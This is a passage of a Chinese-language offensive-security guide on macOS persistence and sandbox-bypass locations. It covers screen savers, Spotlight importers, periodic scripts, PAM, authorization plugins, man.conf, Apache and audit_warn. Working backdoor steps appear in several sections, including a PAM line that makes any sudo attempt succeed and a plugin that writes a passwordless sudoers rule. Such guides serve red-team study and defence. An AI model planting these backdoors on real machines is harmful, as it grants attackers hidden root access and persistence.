<h4 id="位置-18"><a class="header" href="#位置-18">位置</a></h4>
<ul>
<li><code>/System/Library/Screen Savers</code></li>
<li>需要 root 权限</li>
<li><strong>触发</strong>: 选择屏幕保护程序</li>
<li><code>/Library/Screen Savers</code></li>
<li>需要 root 权限</li>
<li><strong>触发</strong>: 选择屏幕保护程序</li>
<li><code>~/Library/Screen Savers</code></li>
<li><strong>触发</strong>: 选择屏幕保护程序</li>
</ul>
<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>
<h4 id="描述与利用-11"><a class="header" href="#描述与利用-11">描述与利用</a></h4>
<p>在 Xcode 中创建一个新项目，并选择模板以生成新的 <strong>屏幕保护程序</strong>。然后，将你的代码添加到其中，例如以下代码以生成日志。</p>
<p><strong>构建</strong>它，并将 <code>.saver</code> 包复制到 <strong><code>~/Library/Screen Savers</code></strong>。然后，打开屏幕保护程序 GUI，点击它，应该会生成大量日志：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="danger" %}
请注意，因为在加载此代码的二进制文件的权限中（<code>/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver</code>）可以找到 <strong><code>com.apple.security.app-sandbox</code></strong>，所以您将处于 <strong>常见应用程序沙箱</strong> 内。
{% endhint %}</p>
<p>Saver code:</p>
<pre><code class="language-objectivec">//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
</code></pre>
<h3 id="spotlight-插件"><a class="header" href="#spotlight-插件">Spotlight 插件</a></h3>
<p>writeup: <a href="https://theevilbit.github.io/beyond/beyond_0011/">https://theevilbit.github.io/beyond/beyond_0011/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但你将进入一个应用程序沙盒</li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
<li>沙盒看起来非常有限</li>
</ul>
<h4 id="位置-19"><a class="header" href="#位置-19">位置</a></h4>
<ul>
<li><code>~/Library/Spotlight/</code></li>
<li><strong>触发</strong>: 创建一个由 Spotlight 插件管理的扩展的新文件。</li>
<li><code>/Library/Spotlight/</code></li>
<li><strong>触发</strong>: 创建一个由 Spotlight 插件管理的扩展的新文件。</li>
<li>需要 root 权限</li>
<li><code>/System/Library/Spotlight/</code></li>
<li><strong>触发</strong>: 创建一个由 Spotlight 插件管理的扩展的新文件。</li>
<li>需要 root 权限</li>
<li><code>Some.app/Contents/Library/Spotlight/</code></li>
<li><strong>触发</strong>: 创建一个由 Spotlight 插件管理的扩展的新文件。</li>
<li>需要新应用</li>
</ul>
<h4 id="描述与利用-12"><a class="header" href="#描述与利用-12">描述与利用</a></h4>
<p>Spotlight 是 macOS 内置的搜索功能，旨在为用户提供 <strong>快速而全面的计算机数据访问</strong>。<br />
为了促进这种快速搜索能力，Spotlight 维护一个 <strong>专有数据库</strong>，并通过 <strong>解析大多数文件</strong> 创建索引，从而能够快速搜索文件名及其内容。</p>
<p>Spotlight 的基本机制涉及一个名为 'mds' 的中央进程，代表 <strong>'元数据服务器'</strong>。该进程协调整个 Spotlight 服务。与此相辅相成的是多个 'mdworker' 守护进程，它们执行各种维护任务，例如索引不同类型的文件 (<code>ps -ef | grep mdworker</code>)。这些任务通过 Spotlight 导入插件或 <strong>".mdimporter bundles"</strong> 实现，使 Spotlight 能够理解和索引各种文件格式的内容。</p>
<p>插件或 <strong><code>.mdimporter</code></strong> 包位于前面提到的位置，如果出现新的包，它会在一分钟内加载（无需重启任何服务）。这些包需要指明它们可以管理的 <strong>文件类型和扩展名</strong>，这样，当创建一个具有指定扩展名的新文件时，Spotlight 将使用它们。</p>
<p>可以通过运行 <strong>找到所有加载的 <code>mdimporters</code></strong>:</p>
<pre><code class="language-bash">mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
</code></pre>
<p>例如 <strong>/Library/Spotlight/iBooksAuthor.mdimporter</strong> 用于解析这些类型的文件（扩展名 <code>.iba</code> 和 <code>.book</code> 等）：</p>
<pre><code class="language-json">plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" =&gt; [
0 =&gt; {
"CFBundleTypeName" =&gt; "iBooks Author Book"
"CFBundleTypeRole" =&gt; "MDImporter"
"LSItemContentTypes" =&gt; [
0 =&gt; "com.apple.ibooksauthor.book"
1 =&gt; "com.apple.ibooksauthor.pkgbook"
2 =&gt; "com.apple.ibooksauthor.template"
3 =&gt; "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" =&gt; 0
}
]
[...]
=&gt; {
"UTTypeConformsTo" =&gt; [
0 =&gt; "public.data"
1 =&gt; "public.composite-content"
]
"UTTypeDescription" =&gt; "iBooks Author Book"
"UTTypeIdentifier" =&gt; "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" =&gt; "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" =&gt; {
"public.filename-extension" =&gt; [
0 =&gt; "iba"
1 =&gt; "book"
]
}
}
[...]
</code></pre>
<p>{% hint style="danger" %}
如果你检查其他 <code>mdimporter</code> 的 Plist，你可能找不到条目 <strong><code>UTTypeConformsTo</code></strong>。这是因为它是一个内置的 <em>统一类型标识符</em> (<a href="https://en.wikipedia.org/wiki/Uniform_Type_Identifier">UTI</a>)，不需要指定扩展名。</p>
<p>此外，系统默认插件总是优先，因此攻击者只能访问未被苹果自己的 <code>mdimporters</code> 索引的文件。
{% endhint %}</p>
<p>要创建你自己的导入器，你可以从这个项目开始：<a href="https://github.com/megrimm/pd-spotlight-importer">https://github.com/megrimm/pd-spotlight-importer</a>，然后更改名称、<strong><code>CFBundleDocumentTypes</code></strong> 并添加 <strong><code>UTImportedTypeDeclarations</code></strong>，以便支持你想要支持的扩展，并在 <strong><code>schema.xml</code></strong> 中反映它们。<br />
然后 <strong>更改</strong> 函数 <strong><code>GetMetadataForFile</code></strong> 的代码，以便在创建具有处理扩展名的文件时执行你的有效载荷。</p>
<p>最后 <strong>构建并复制你的新 <code>.mdimporter</code></strong> 到之前的一个位置，你可以通过 <strong>监控日志</strong> 或检查 <strong><code>mdimport -L.</code></strong> 来查看它是否被加载。</p>
<h3 id="偏好面板"><a class="header" href="#偏好面板"><del>偏好面板</del></a></h3>
<p>{% hint style="danger" %}
看起来这个不再有效了。
{% endhint %}</p>
<p>写作： <a href="https://theevilbit.github.io/beyond/beyond_0009/">https://theevilbit.github.io/beyond/beyond_0009/</a></p>
<ul>
<li>有助于绕过沙盒： <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>需要特定用户操作</li>
<li>TCC 绕过： <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-20"><a class="header" href="#位置-20">位置</a></h4>
<ul>
<li><strong><code>/System/Library/PreferencePanes</code></strong></li>
<li><strong><code>/Library/PreferencePanes</code></strong></li>
<li><strong><code>~/Library/PreferencePanes</code></strong></li>
</ul>
<h4 id="描述-4"><a class="header" href="#描述-4">描述</a></h4>
<p>看起来这个不再有效了。</p>
<h2 id="root-沙盒绕过"><a class="header" href="#root-沙盒绕过">Root 沙盒绕过</a></h2>
<p>{% hint style="success" %}
在这里你可以找到有用的 <strong>沙盒绕过</strong> 启动位置，允许你通过 <strong>写入文件</strong> 以 <strong>root</strong> 身份简单执行某些操作和/或需要其他 <strong>奇怪条件</strong>。
{% endhint %}</p>
<h3 id="定期"><a class="header" href="#定期">定期</a></h3>
<p>写作： <a href="https://theevilbit.github.io/beyond/beyond_0019/">https://theevilbit.github.io/beyond/beyond_0019/</a></p>
<ul>
<li>有助于绕过沙盒： <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但你需要是 root</li>
<li>TCC 绕过： <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-21"><a class="header" href="#位置-21">位置</a></h4>
<ul>
<li><code>/etc/periodic/daily</code>, <code>/etc/periodic/weekly</code>, <code>/etc/periodic/monthly</code>, <code>/usr/local/etc/periodic</code></li>
<li>需要 root</li>
<li><strong>触发</strong>： 当时间到来时</li>
<li><code>/etc/daily.local</code>, <code>/etc/weekly.local</code> 或 <code>/etc/monthly.local</code></li>
<li>需要 root</li>
<li><strong>触发</strong>： 当时间到来时</li>
</ul>
<h4 id="描述与利用-13"><a class="header" href="#描述与利用-13">描述与利用</a></h4>
<p>定期脚本 (<strong><code>/etc/periodic</code></strong>) 是由于在 <code>/System/Library/LaunchDaemons/com.apple.periodic*</code> 中配置的 <strong>启动守护进程</strong> 而执行的。请注意，存储在 <code>/etc/periodic/</code> 中的脚本是以 <strong>文件所有者</strong> 的身份 <strong>执行</strong> 的，因此这对于潜在的特权升级无效。</p>
<pre><code class="language-bash"># Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
</code></pre>
<p>{% endcode %}</p>
<p>还有其他定期脚本将在 <strong><code>/etc/defaults/periodic.conf</code></strong> 中指示执行：</p>
<pre><code class="language-bash">grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
</code></pre>
<p>如果您成功写入任何文件 <code>/etc/daily.local</code>、<code>/etc/weekly.local</code> 或 <code>/etc/monthly.local</code>，它将会 <strong>迟早被执行</strong>。</p>
<p>{% hint style="warning" %}
请注意，周期性脚本将以 <strong>脚本所有者的身份执行</strong>。因此，如果常规用户拥有该脚本，它将以该用户的身份执行（这可能会防止特权升级攻击）。
{% endhint %}</p>
<h3 id="pam"><a class="header" href="#pam">PAM</a></h3>
<p>写作： <a href="../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.html">Linux Hacktricks PAM</a><br />
写作： <a href="https://theevilbit.github.io/beyond/beyond_0005/">https://theevilbit.github.io/beyond/beyond_0005/</a></p>
<ul>
<li>有助于绕过沙箱： <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但您需要是 root</li>
<li>TCC 绕过： <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-22"><a class="header" href="#位置-22">位置</a></h4>
<ul>
<li>始终需要 root</li>
</ul>
<h4 id="描述与利用-14"><a class="header" href="#描述与利用-14">描述与利用</a></h4>
<p>由于 PAM 更专注于 <strong>持久性</strong> 和恶意软件，而不是在 macOS 中的简单执行，因此本博客不会给出详细的解释，<strong>请阅读写作以更好地理解此技术</strong>。</p>
<p>使用以下命令检查 PAM 模块：</p>
<pre><code class="language-bash">ls -l /etc/pam.d
</code></pre>
<p>一种利用PAM的持久性/特权提升技术，修改模块 /etc/pam.d/sudo 在开头添加以下行是非常简单的：</p>
<pre><code class="language-bash">auth       sufficient     pam_permit.so
</code></pre>
<p>所以它看起来像这样：</p>
<pre><code class="language-bash"># sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
</code></pre>
<p>因此，任何尝试使用 <strong><code>sudo</code> 都会有效</strong>。</p>
<p>{% hint style="danger" %}
请注意，此目录受到 TCC 保护，因此用户很可能会收到请求访问的提示。
{% endhint %}</p>
<p>另一个不错的例子是 su，您可以看到也可以向 PAM 模块提供参数（您也可以在此文件中植入后门）：</p>
<pre><code class="language-bash">cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
</code></pre>
<h3 id="授权插件"><a class="header" href="#授权插件">授权插件</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0028/">https://theevilbit.github.io/beyond/beyond_0028/</a><br />
Writeup: <a href="https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65">https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但你需要是root并进行额外配置</li>
<li>TCC 绕过: ???</li>
</ul>
<h4 id="位置-23"><a class="header" href="#位置-23">位置</a></h4>
<ul>
<li><code>/Library/Security/SecurityAgentPlugins/</code></li>
<li>需要root权限</li>
<li>还需要配置授权数据库以使用该插件</li>
</ul>
<h4 id="描述与利用-15"><a class="header" href="#描述与利用-15">描述与利用</a></h4>
<p>你可以创建一个授权插件，当用户登录时执行以保持持久性。有关如何创建这些插件的更多信息，请查看之前的写作（并小心，编写不当可能会锁定你，你需要从恢复模式清理你的mac）。</p>
<pre><code class="language-objectivec">// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import &lt;Foundation/Foundation.h&gt;

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers");
}
</code></pre>
<p><strong>将</strong>捆绑包移动到要加载的位置：</p>
<pre><code class="language-bash">cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
</code></pre>
<p>最后添加<strong>规则</strong>以加载此插件：</p>
<pre><code class="language-bash">cat &gt; /tmp/rule.plist &lt;&lt;EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;class&lt;/key&gt;
&lt;string&gt;evaluate-mechanisms&lt;/string&gt;
&lt;key&gt;mechanisms&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;CustomAuth:login,privileged&lt;/string&gt;
&lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

security authorizationdb write com.asdf.asdf &lt; /tmp/rule.plist
</code></pre>
<p><strong><code>evaluate-mechanisms</code></strong> 将告诉授权框架它需要 <strong>调用外部机制进行授权</strong>。此外，<strong><code>privileged</code></strong> 将使其由 root 执行。</p>
<p>通过以下方式触发它：</p>
<pre><code class="language-bash">security authorize com.asdf.asdf
</code></pre>
<p>然后<strong>staff组应该拥有sudo</strong>访问权限（阅读<code>/etc/sudoers</code>以确认）。</p>
<h3 id="manconf"><a class="header" href="#manconf">Man.conf</a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0030/">https://theevilbit.github.io/beyond/beyond_0030/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但你需要是root，用户必须使用man</li>
<li>TCC绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-24"><a class="header" href="#位置-24">位置</a></h4>
<ul>
<li><strong><code>/private/etc/man.conf</code></strong></li>
<li>需要root权限</li>
<li><strong><code>/private/etc/man.conf</code></strong>: 每当使用man时</li>
</ul>
<h4 id="描述与利用-16"><a class="header" href="#描述与利用-16">描述与利用</a></h4>
<p>配置文件**<code>/private/etc/man.conf</code>**指示在打开man文档文件时使用的二进制文件/脚本。因此，可以修改可执行文件的路径，以便每当用户使用man阅读文档时，都会执行一个后门。</p>
<p>例如在**<code>/private/etc/man.conf</code>**中设置:</p>
<pre><code>MANPAGER /tmp/view
</code></pre>
<p>然后创建 <code>/tmp/view</code> 为：</p>
<pre><code class="language-bash">#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
</code></pre>
<h3 id="apache2"><a class="header" href="#apache2">Apache2</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0023/">https://theevilbit.github.io/beyond/beyond_0023/</a></p>
<ul>
<li>有助于绕过沙箱: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但你需要是root，并且apache需要正在运行</li>
<li>TCC绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
<li>Httpd没有权限</li>
</ul>
<h4 id="位置-25"><a class="header" href="#位置-25">位置</a></h4>
<ul>
<li><strong><code>/etc/apache2/httpd.conf</code></strong></li>
<li>需要root权限</li>
<li>触发: 当Apache2启动时</li>
</ul>
<h4 id="描述与利用-17"><a class="header" href="#描述与利用-17">描述与利用</a></h4>
<p>你可以在<code>/etc/apache2/httpd.conf</code>中指示加载一个模块，添加一行如下:</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
</code></pre>
<p>{% endcode %}</p>
<p>这样，您的编译模块将由 Apache 加载。唯一需要注意的是，您需要 <strong>用有效的 Apple 证书签名</strong>，或者您需要 <strong>在系统中添加一个新的受信任证书</strong> 并 <strong>用它签名</strong>。</p>
<p>然后，如果需要，确保服务器将启动，您可以执行：</p>
<pre><code class="language-bash">sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
</code></pre>
<p>Dylb的代码示例：</p>
<pre><code class="language-objectivec">#include &lt;stdio.h&gt;
#include &lt;syslog.h&gt;

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
</code></pre>
<h3 id="bsm审计框架"><a class="header" href="#bsm审计框架">BSM审计框架</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0031/">https://theevilbit.github.io/beyond/beyond_0031/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但你需要是root，auditd需要运行并引发警告</li>
<li>TCC绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-26"><a class="header" href="#位置-26">位置</a></h4>
<ul>
<li><strong><code>/etc/security/audit_warn</code></strong></li>
<li>需要root权限</li>
<li><strong>触发</strong>: 当auditd检测到警告时</li>
</ul>
<h4 id="描述与利用-18"><a class="header" href="#描述与利用-18">描述与利用</a></h4>
<p>每当auditd检测到警告时，脚本**<code>/etc/security/audit_warn</code><strong>会被</strong>执行**。因此你可以在其中添加你的有效载荷。</p>
<pre><code class="language-bash">echo "touch /tmp/auditd_warn" &gt;&gt; /etc/security/audit_warn
</code></pre>
<p>您可以使用 <code>sudo audit -n</code> 强制发出警告。</p>
<h3 id="启动项"><a class="header" href="#启动项">启动项</a></h3>
<p>{% hint style="danger" %}
<strong>这已被弃用，因此这些目录中不应找到任何内容。</strong>
{% endhint %}</p>
<p><strong>StartupItem</strong> 是一个目录，应该位于 <code>/Library/StartupItems/</code> 或 <code>/System/Library/StartupItems/</code> 中。一旦建立此目录，它必须包含两个特定文件：</p>
<ol>
<li>一个 <strong>rc 脚本</strong>：在启动时执行的 shell 脚本。</li>
<li>一个 <strong>plist 文件</strong>，特定命名为 <code>StartupParameters.plist</code>，其中包含各种配置设置。</li>
</ol>
<p>确保 rc 脚本和 <code>StartupParameters.plist</code> 文件正确放置在 <strong>StartupItem</strong> 目录中，以便启动过程能够识别和使用它们。</p>
<p>{% tabs %}
{% tab title="StartupParameters.plist" %}</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Description&lt;/key&gt;
&lt;string&gt;This is a description of this service&lt;/string&gt;
&lt;key&gt;OrderPreference&lt;/key&gt;
&lt;string&gt;None&lt;/string&gt; &lt;!--Other req services to execute before this --&gt;
&lt;key&gt;Provides&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;superservicename&lt;/string&gt; &lt;!--Name of the services provided by this file --&gt;
&lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="超级服务名称" %}</p>
<pre><code class="language-bash">#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h3 id="emond"><a class="header" href="#emond"><del>emond</del></a></h3>
<p>{% hint style="danger" %}
我在我的 macOS 中找不到这个组件，因此有关更多信息，请查看写作
{% endhint %}</p>
<p>写作：<a href="https://theevilbit.github.io/beyond/beyond_0023/">https://theevilbit.github.io/beyond/beyond_0023/</a></p>
<p>由苹果公司引入，<strong>emond</strong> 是一种日志记录机制，似乎未得到充分开发或可能被遗弃，但仍然可以访问。虽然对 Mac 管理员来说并不特别有益，但这个模糊的服务可能作为威胁行为者的微妙持久性方法，可能不会被大多数 macOS 管理员注意到。</p>
<p>对于那些知道其存在的人，识别 <strong>emond</strong> 的任何恶意使用是简单的。该服务的系统 LaunchDaemon 在一个目录中寻找要执行的脚本。要检查这一点，可以使用以下命令：</p>
<pre><code class="language-bash">ls -l /private/var/db/emondClients
</code></pre>
<h3 id="xquartz"><a class="header" href="#xquartz"><del>XQuartz</del></a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0018/">https://theevilbit.github.io/beyond/beyond_0018/</a></p>
<h4 id="位置-27"><a class="header" href="#位置-27">位置</a></h4>
<ul>
<li><strong><code>/opt/X11/etc/X11/xinit/privileged_startx.d</code></strong></li>
<li>需要root权限</li>
<li><strong>触发</strong>: 使用XQuartz</li>
</ul>
<h4 id="描述与利用-19"><a class="header" href="#描述与利用-19">描述与利用</a></h4>
<p>XQuartz <strong>不再安装在macOS中</strong>，所以如果你想要更多信息，请查看写作。</p>
<h3 id="kext"><a class="header" href="#kext"><del>kext</del></a></h3>
<p>{% hint style="danger" %}
即使作为root安装kext也非常复杂，因此我不会考虑这作为逃避沙箱或持久性的方法（除非你有一个漏洞）
{% endhint %}</p>
<h4 id="位置-28"><a class="header" href="#位置-28">位置</a></h4>
<p>为了将KEXT作为启动项安装，它需要<strong>安装在以下位置之一</strong>：</p>
<ul>
<li><code>/System/Library/Extensions</code></li>
<li>内置于OS X操作系统的KEXT文件。</li>
<li><code>/Library/Extensions</code></li>
<li>由第三方软件安装的KEXT文件</li>
</ul>
<p>你可以使用以下命令列出当前加载的kext文件：</p>
<pre><code class="language-bash">kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
</code></pre>
<p>对于有关<a href="macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers"><strong>内核扩展的更多信息，请查看本节</strong></a>。</p>
<h3 id="amstoold"><a class="header" href="#amstoold"><del>amstoold</del></a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0029/">https://theevilbit.github.io/beyond/beyond_0029/</a></p>
<h4 id="位置-29"><a class="header" href="#位置-29">位置</a></h4>
<ul>
<li><strong><code>/usr/local/bin/amstoold</code></strong></li>
<li>需要root权限</li>
</ul>
<h4 id="描述与利用-20"><a class="header" href="#描述与利用-20">描述与利用</a></h4>
<p>显然，<code>/System/Library/LaunchAgents/com.apple.amstoold.plist</code>中的<code>plist</code>正在使用这个二进制文件，同时暴露了一个XPC服务……问题是这个二进制文件并不存在，因此你可以在这里放置一些东西，当XPC服务被调用时，你的二进制文件将被调用。</p>
<p>我在我的macOS中再也找不到这个。</p>
<h3 id="xsanctl"><a class="header" href="#xsanctl"><del>xsanctl</del></a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0015/">https://theevilbit.github.io/beyond/beyond_0015/</a></p>
<h4 id="位置-30"><a class="header" href="#位置-30">位置</a></h4>
<ul>
<li><strong><code>/Library/Preferences/Xsan/.xsanrc</code></strong></li>
<li>需要root权限</li>
<li><strong>触发</strong>: 当服务运行时（很少）</li>
</ul>
<h4 id="描述与利用-21"><a class="header" href="#描述与利用-21">描述与利用</a></h4>
<p>显然，运行这个脚本并不常见，我甚至在我的macOS中找不到它，因此如果你想要更多信息，请查看写作。</p>
<h3 id="etcrccommon"><a class="header" href="#etcrccommon"><del>/etc/rc.common</del></a></h3>
<p>{% hint style="danger" %}
<strong>这在现代MacOS版本中不起作用</strong>
{% endhint %}</p>
<p>在这里也可以放置<strong>在启动时执行的命令。</strong> 示例是常规的rc.common脚本:</p>
<pre><code class="language-bash">#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] &amp;&amp; [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2&gt;/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2&gt; /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
</code></pre>
<h2 id="持久性技术和工具"><a class="header" href="#持久性技术和工具">持久性技术和工具</a></h2>
<ul>
<li><a href="https://github.com/cedowens/Persistent-Swift">https://github.com/cedowens/Persistent-Swift</a></li>
<li><a href="https://github.com/D00MFist/PersistentJXA">https://github.com/D00MFist/PersistentJXA</a></li>
</ul>
<p>{% hint style="success" %}
